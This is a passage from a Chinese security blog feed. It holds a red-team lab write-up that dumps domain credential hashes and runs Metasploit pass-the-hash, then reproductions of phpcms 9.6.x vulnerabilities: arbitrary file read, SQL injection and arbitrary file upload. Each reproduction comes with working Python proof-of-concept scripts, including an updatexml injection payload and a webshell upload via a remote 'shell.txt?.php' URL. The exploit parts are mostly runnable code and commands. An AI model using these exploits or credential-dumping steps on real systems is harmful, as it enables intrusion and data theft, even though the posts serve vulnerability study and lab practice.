Domain   : (null)     * Password : (null)    ssp :        credman :    Authentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : OWA$Domain            : GODLogon Server      : (null)Logon Time        : 2020/2/16 20:59:17SID               : S-1-5-18    msv :        tspkg :        wdigest :         * Username : OWA$     * Domain   : GOD     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     kerberos :         * Username : owa$     * Domain   : GOD.ORG     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     ssp :        credman :    ** SAM ACCOUNT **SAM Username         : krbtgtObject Security ID   : S-1-5-21-2952760202-1353902439-2381784089-502Object Relative ID   : 502Credentials:  Hash NTLM: 58e91a5ac358d86513ab224312314061Object RDN           : Read-only Domain Controllers** SAM ACCOUNT **SAM Username         : AdministratorObject Security ID   : S-1-5-21-2952760202-1353902439-2381784089-500Object Relative ID   : 500Credentials:  Hash NTLM: a45a7246dd74b64a67f22fd7020f1bd8Object RDN           : Administrators502    krbtgt    58e91a5ac358d86513ab2243123140611106    ligang    1e3d22f88dfd250c9312d21686c60f411107    DEV1$    bed18e5b9d13bb384a3041a10d43c01b1104    ROOT-TVI862UBEH$    5604267003351107febdc6ed4e2dfdce1105    STU1$    cb45e05d22e8106184056e55ac541149500    Administrator    a45a7246dd74b64a67f22fd7020f1bd81001    OWA$    f8ddc71a57488df647086512711859691108    gqy    aa3afe73b6e0c2d87b3a428bf696ae711000    liukaifeng01    a45a7246dd74b64a67f22fd7020f1bd8</code></pre><p>可惜没有明文密码</p><p>利用pth登陆Administrator</p><p>先导出system 和 NTDS.dit</p><pre><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q qNTDSDumpEx -d ntds.dit -s system -o domain.txt得到hashAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><p>用msf上的<code>exploit/windows/smb/psexec</code>来进行pth攻击</p><pre><code>use exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhost xxxset lport xxxset rhosts 192.168.52.138set smbuser Administratorset smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><p><img src="https://i.loli.net/2020/02/17/9oLDYlWv5GBwOUN.png" alt="image12506"></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/17/vulnstackATT&CK红队评估靶场1渗透记录/">https://www.ccreater.top/2020/02/17/vulnstackATT&amp;CK红队评估靶场1渗透记录/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> 靶场 </tag>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcmsv9.6.1任意文件读取</title>
      <link href="2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>2020/02/13/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-1任意文件读取"><a href="#phpcmsv9-6-1任意文件读取" class="headerlink" title="phpcmsv9.6.1任意文件读取"></a>phpcmsv9.6.1任意文件读取</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置: <code>phpcms/modules/content/down.php</code> 。在该文件的 <code>download</code> 方法中最后一行调用了 <code>file_down</code> 文件下载函数，我们可以看到其第一个参数是要读取的文件路径。 </p><pre><code class="php">    public function download() {        $a_k = trim($_GET[&#39;a_k&#39;]);        $pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);        $a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));        unset($i,$m,$f,$t,$ip);        parse_str($a_k);                ...        $starttime = intval($t);        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));        $fileurl = trim($f);        if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]{10}/&quot;, $starttime) || !preg_match(&quot;/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/&quot;, $ip) || $ip != ip()) showmessage(L(&#39;illegal_parameters&#39;));            $endtime = SYS_TIME - $starttime;        if($endtime &gt; 3600) showmessage(L(&#39;url_invalid&#39;));        if($m) $fileurl = trim($s).trim($fileurl);        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));        //远程文件        if(strpos($fileurl, &#39;:/&#39;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;)) === false)) {             header(&quot;Location: $fileurl&quot;);        } else {            if($d == 0) {                header(&quot;Location: &quot;.$fileurl);            } else {                $fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);                $filename = basename($fileurl);                //处理中文文件                if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) {                    $filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));                    $filename = urldecode(basename($filename));                }                $ext = fileext($filename);                $filename = date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;                $fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);                file_down($fileurl, $filename);            }        }    }</code></pre><p>我们跟进<code>file_down</code>:</p><pre><code class="php">function file_down($filepath, $filename = &#39;&#39;) {    if(!$filename) $filename = basename($filepath);    if(is_ie()) $filename = rawurlencode($filename);    $filetype = fileext($filename);    $filesize = sprintf(&quot;%u&quot;, filesize($filepath));    if(ob_get_length() !== false) @ob_end_clean();    header(&#39;Pragma: public&#39;);    header(&#39;Last-Modified: &#39;.gmdate(&#39;D, d M Y H:i:s&#39;) . &#39; GMT&#39;);    header(&#39;Cache-Control: no-store, no-cache, must-revalidate&#39;);    header(&#39;Cache-Control: pre-check=0, post-check=0, max-age=0&#39;);    header(&#39;Content-Transfer-Encoding: binary&#39;);    header(&#39;Content-Encoding: none&#39;);    header(&#39;Content-type: &#39;.$filetype);    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.$filename.&#39;&quot;&#39;);    header(&#39;Content-length: &#39;.$filesize);    readfile($filepath);    exit;}</code></pre><p>可以看到他会直接读取文件然后,exit</p><p>我们再看下<code>download</code>中的<code>$fileurl</code>的生成过程:</p><pre><code class="php">if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));if($m) $fileurl = trim($s).trim($fileurl);if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));$fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);$fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);</code></pre><p><code>$fileurl</code>由<code>$f</code>产生的,其中不能带有php等关键字,但是我们可以利用最后一行的str_replace来绕过,而<code>$f</code>由<code>parse_str($a_k)</code>得来的</p><p>那么接下来我们要找一处</p><pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);$a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);</code></pre><p>以<code>$pc_auth_key</code>作为密钥的加密点</p><p><img src="https://i.loli.net/2020/02/13/csXBxCmkdWqj3or.png" alt="image3860"></p><p>显然只有中间的那个可以</p><pre><code class="php">$pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &#39;ENCODE&#39;, $pc_auth_key));$downurl = &#39;?m=content&amp;c=down&amp;a=download&amp;a_k=&#39;.$a_k;</code></pre><p>而<code>$i,$m,$f</code>等都是从<code>parse_str($a_k);</code>获得</p><pre><code class="php">        parse_str($a_k);        if(isset($i)) $i = $id = intval($i);        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));</code></pre><p>接下来就跟9.6.0版本的sql注入相同了</p><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import reimport requestsimport randomfrom urllib.parse import quotedef poc(url,proxies={}):    sess=requests.session()    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)    sess.proxies=proxies    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]    param={        &quot;m&quot;:&quot;attachment&quot;,        &quot;c&quot;:&quot;attachments&quot;,        &quot;a&quot;:&quot;swfupload_json&quot;,        &quot;src&quot;:&quot;=1&amp;m=aa&amp;i=1&amp;modelid=1&amp;catid=1&amp;f=%s&amp;ss=&quot; % quote(&quot;index.p&lt;h&lt;p&amp;d=1&quot;)    }    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})    #print(sess.cookies.get_dict())    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text    #print(userid,a_k)    a_k=re.search(&#39;&#39;&#39;a_k=([^&quot;]*)&#39;&#39;&#39;,result).groups()[0]    #print(result)    #print(a_k)    res=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=%s&quot;%(url,a_k))    if res.status_code==200 and &quot;pc_base::creat_app();&quot; in res.text:        return True    else :        return False#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.1/&quot;))</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集/</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/13/phpcmsv9.6.1任意文件读取/">https://www.ccreater.top/2020/02/13/phpcmsv9.6.1任意文件读取/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcmsv9.6.0SQL注入</title>
      <link href="2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/"/>
      <url>2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-0SQL注入"><a href="#phpcmsv9-6-0SQL注入" class="headerlink" title="phpcmsv9.6.0SQL注入"></a>phpcmsv9.6.0SQL注入</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li>开启wap</li><li>phpcms 版本小于等于9.6.0</li></ol><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞信息:</p><blockquote><p>这个版本的 <strong>SQL注入</strong> 主要在于程序对解密后的数据没有进行过滤. 漏洞文件: <strong>phpcms/modules/content/down.php</strong> 。在其 <strong>init</strong> 方法中，从 <strong>GET</strong> 数据中获取了 <strong>a_k</strong> 的值 ,解密后直接变量覆盖,导致命令执行</p></blockquote><pre><code class="php">public function init() {        $a_k = trim($_GET[&#39;a_k&#39;]);        $a_k = sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));        parse_str($a_k);        if(isset($i)) $i = $id = intval($i);        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));        $allow_visitor = 1;        $MODEL = getcache(&#39;model&#39;,&#39;commons&#39;);        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&#39;tablename&#39;];        $this-&gt;db-&gt;table_name = $tablename.&#39;_data&#39;;        $rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));            ...    }</code></pre><p><code>$this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>跟进去</p><pre><code class="php">final public function get_one($where = &#39;&#39;, $data = &#39;*&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {        if (is_array($where)) $where = $this-&gt;sqls($where);        return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);    }</code></pre><pre><code class="php">final public function sqls($where, $font = &#39; AND &#39;) {        if (is_array($where)) {            $sql = &#39;&#39;;            foreach ($where as $key=&gt;$val) {                $sql .= $sql ? &quot; $font `$key` = &#39;$val&#39; &quot; : &quot; `$key` = &#39;$val&#39;&quot;;            }            return $sql;        } else {            return $where;        }    }</code></pre><pre><code class="php">public function get_one($data, $table, $where = &#39;&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {        $where = $where == &#39;&#39; ? &#39;&#39; : &#39; WHERE &#39;.$where;        $order = $order == &#39;&#39; ? &#39;&#39; : &#39; ORDER BY &#39;.$order;        $group = $group == &#39;&#39; ? &#39;&#39; : &#39; GROUP BY &#39;.$group;        $limit = &#39; LIMIT 1&#39;;        $field = explode( &#39;,&#39;, $data);        array_walk($field, array($this, &#39;add_special_char&#39;));        $data = implode(&#39;,&#39;, $field);        $sql = &#39;SELECT &#39;.$data.&#39; FROM `&#39;.$this-&gt;config[&#39;database&#39;].&#39;`.`&#39;.$table.&#39;`&#39;.$where.$group.$order.$limit;        $this-&gt;execute($sql);        $res = $this-&gt;fetch_next();        $this-&gt;free_result();        return $res;    }</code></pre><p>没有对解密后的id进行任何过滤</p><p>接着要找一个能用相同密钥加密的地方,这样便无需暴露auth_key就能执行恶意sql语句</p><p>我们利用<code>set_cookie</code>来生成加密数据</p><p><code>setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);</code></p><p>查找调用<code>set_cookie</code>且值<code>$value</code>可控的位置</p><p><code>phpcms/modules/attachment/attachments.php</code> 文件的 <code>swfupload_json</code> 方法有满足我们需要的代码。(菜鸡直接看别人找到的)</p><pre><code class="php">public function swfupload_json() {        $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);        $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));        $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));        $json_str = json_encode($arr);        $att_arr_exist = param::get_cookie(&#39;att_json&#39;);        $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);        if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {            return true;        } else {            $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;            param::set_cookie(&#39;att_json&#39;,$json_str);            return true;                    }    }</code></pre><p><code>$arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));</code>,跟进<code>safe_replace</code></p><pre><code class="php">function safe_replace($string) {    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;&quot;&#39;,&#39;&amp;quot;&#39;,$string);    $string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);    $string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);    $string = str_replace(&quot;{&quot;,&#39;&#39;,$string);    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);    return $string;}</code></pre><p>虽然这里单引号被过滤了,但是前面是用<code>parse_str($a_k);</code>来恢复变量的,我们可以利用<code>safe_replace</code>能将某些字符替换为空格用url编码来绕过黑名单</p><p>但是在调用<code>swfupload_json</code> 前,它还会调用<code>__construct</code>方法</p><pre><code class="php">function __construct() {        pc_base::load_app_func(&#39;global&#39;);        $this-&gt;upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);        $this-&gt;upload_path = pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;);                $this-&gt;imgext = array(&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;jpeg&#39;);        $this-&gt;userid = $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));        $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&#39;roleid&#39;] ? 1 : 0;        $this-&gt;groupid = param::get_cookie(&#39;_groupid&#39;) ? param::get_cookie(&#39;_groupid&#39;) : 8;        //判断是否登录        if(empty($this-&gt;userid)){            showmessage(L(&#39;please_login&#39;,&#39;&#39;,&#39;member&#39;));        }    }</code></pre><p>我们需要用<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)</code>来生成<code>$this-&gt;userid</code>,来绕过死亡exit</p><p>这次我们还需要找一个地方来生成<code>userid</code>,但是限制更少了,只要<code>$this-&gt;userid</code>不为空即可</p><p> 我们可以搜到 <code>phpcms/modules/wap/index.php</code> 文件，在该文件中 <code>$_GET[&#39;siteid&#39;]</code> 可控，并且可以通过 <strong>cookie</strong> 获得加密后的数据,虽然有intval来过滤</p><pre><code class="php">function __construct() {                $this-&gt;db = pc_base::load_model(&#39;content_model&#39;);        $this-&gt;siteid = isset($_GET[&#39;siteid&#39;]) &amp;&amp; (intval($_GET[&#39;siteid&#39;]) &gt; 0) ? intval(trim($_GET[&#39;siteid&#39;])) : (param::get_cookie(&#39;siteid&#39;) ? param::get_cookie(&#39;siteid&#39;) : 1);        param::set_cookie(&#39;siteid&#39;,$this-&gt;siteid);            $this-&gt;wap_site = getcache(&#39;wap_site&#39;,&#39;wap&#39;);        $this-&gt;types = getcache(&#39;wap_type&#39;,&#39;wap&#39;);        $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];        define(&#39;WAP_SITEURL&#39;, $this-&gt;wap[&#39;domain&#39;] ? $this-&gt;wap[&#39;domain&#39;].&#39;index.php?&#39; : APP_PATH.&#39;index.php?m=wap&amp;siteid=&#39;.$this-&gt;siteid);        if($this-&gt;wap[&#39;status&#39;]!=1) exit(L(&#39;wap_close_status&#39;));    }</code></pre><p>于是整个攻击链便完整了</p><p>先利用wap来获得<code>userid</code></p><p><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&amp;siteid=1</code></p><p><code>2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></p><p>再利用attachment来获得加密的恶意sql语句</p><pre><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=(看poc吧)post:userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import reimport requestsimport randomdef poc(url,proxies={}):    sess=requests.session()    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)    sess.proxies=proxies    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]    param={        &quot;m&quot;:&quot;attachment&quot;,        &quot;c&quot;:&quot;attachments&quot;,        &quot;a&quot;:&quot;swfupload_json&quot;,        &quot;src&quot;:&quot;=1&amp;id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=1&amp;ss&quot;    }    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text    #print(userid,a_k)    if &quot;XPATH syntax error&quot; in result:        return True    return False#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集</a></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/02/13/phpcmsv9.6.0SQL注入/">https://www.ccreater.top/2020/02/13/phpcmsv9.6.0SQL注入/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcms960任意文件上传复现</title>
      <link href="2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-0任意文件上传"><a href="#phpcmsv9-6-0任意文件上传" class="headerlink" title="phpcmsv9.6.0任意文件上传"></a>phpcmsv9.6.0任意文件上传</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>phpcms v9.6.0</p><p>开启用户注册功能</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据网络上提供的poc进行漏洞复现:</p><pre><code class="python">import reimport requestsdef poc(url):    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)    data = {        &#39;siteid&#39;: &#39;1&#39;,        &#39;modelid&#39;: &#39;1&#39;,        &#39;username&#39;: &#39;test&#39;,        &#39;password&#39;: &#39;testxx&#39;,        &#39;email&#39;: &#39;test@test.com&#39;,        &#39;info[content]&#39;: &#39;&lt;img src=http://url/shell.txt?.php#.jpg&gt;&#39;,        &#39;dosubmit&#39;: &#39;1&#39;,    }    rep = requests.post(u, data=data)    shell = &#39;&#39;    re_result = re.findall(r&#39;&amp;lt;img src=(.*)&amp;gt&#39;, rep.content)    if len(re_result):        shell = re_result[0]        print shell</code></pre><p>漏洞的关键位置</p><p><code>phpcms/modules/member/index.php</code>:135</p><pre><code class="php">if($member_setting[&#39;choosemodel&#39;]) {    require_once CACHE_MODEL_PATH.&#39;member_input.class.php&#39;;    require_once CACHE_MODEL_PATH.&#39;member_update.class.php&#39;;    $member_input = new member_input($userinfo[&#39;modelid&#39;]);            $_POST[&#39;info&#39;] = array_map(&#39;new_html_special_chars&#39;,$_POST[&#39;info&#39;]);    $user_model_info = $member_input-&gt;get($_POST[&#39;info&#39;]);                                        }</code></pre><p><code>$_POST[&#39;info&#39;]</code>被<code>new_html_special_chars</code>处理后,直接作为参数传入<code>$member_input-&gt;get</code></p><p>跟进去发现</p><pre><code class="php">if(is_array($data)) {            foreach($data as $field=&gt;$value) {                ...                $field = safe_replace($field);                ...                $func = $this-&gt;fields[$field][&#39;formtype&#39;];                if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);                $info[$field] = $value;            }        }</code></pre><p><code>$this-&gt;$func($field, $value);</code>令人浮想联翩的命令,而<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>,其中<code>$field</code>是我们可控的输入<code>new_html_special_chars($_POST[&#39;info&#39;]) as $field=&gt;$value</code></p><p>而<code>$this-&gt;fields[$field][&#39;formtype&#39;];</code>有以下取值,我们可以控制其执行某一函数</p><pre><code 